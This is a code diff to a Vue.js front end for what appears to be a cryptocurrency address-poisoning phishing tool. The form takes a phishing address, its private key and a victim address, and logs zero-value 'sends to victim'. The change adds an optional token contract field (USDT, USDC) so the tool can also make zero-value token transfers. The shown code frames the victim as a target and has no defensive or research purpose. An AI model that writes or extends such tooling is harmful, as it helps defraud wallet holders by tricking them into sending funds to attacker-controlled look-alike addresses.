@@ -34,7 +34,7 @@
                         autocomplete="off"
                     />
                 </div>
-                <div class="col-md-4 col-sm-12 mt-2">
+                <div class="col-md-4 col-sm-6 mt-2">
                     <label for="fund-amt">Fund Amount (Gas)</label>
                     <input
                         id="fund-amt"
@@ -43,6 +43,18 @@
                         placeholder="0.00002"
                         v-model="fundAmount"
                         :disabled="running"
+                    />
+                </div>
+                <div class="col-md-4 col-sm-6 mt-2">
+                    <label for="token-addr">Token Contract (Optional)</label>
+                    <input
+                        id="token-addr"
+                        type="text"
+                        class="text-input-large"
+                        placeholder="0x USDT, USDC..."
+                        v-model="tokenAddress"
+                        :disabled="running"
+                        autocomplete="off"
                     />
                 </div>
             </div>
@@ -89,6 +101,7 @@
                 phishingAddress: '',
                 phishingPrivateKey: '',
                 fundAmount: '0.00002',
+                tokenAddress: '',
                 running: false,
                 logs: [],
             };
@@ -130,6 +143,7 @@
                             phishingAddress: this.phishingAddress,
                             phishingPrivateKey: this.phishingPrivateKey,
                             fundAmount: this.fundAmount,
+                            tokenAddress: this.tokenAddress,
                         }),
                     });
 
@@ -144,7 +158,19 @@
                                 'success'
                             );
                         }
-                        this.addLog(`Step 2: Sent 0 ETH to victim (${this.victimAddress.slice(0, 8)}...).`, 'success');
+
+                        if (this.tokenAddress) {
+                            this.addLog(
+                                `Step 2: Sent 0 Tokens to victim via contract ${this.tokenAddress.slice(0, 8)}...`,
+                                'success'
+                            );
+                        } else {
+                            this.addLog(
+                                `Step 2: Sent 0 ETH to victim (${this.victimAddress.slice(0, 8)}...).`,
+                                'success'
+                            );
+                        }
+
                         this.addLog(`Execution completed: ${result.hash.slice(0, 15)}...`, 'success');
                     } else {
                         this.addLog(`Execution failed: ${result.error}`, 'error');
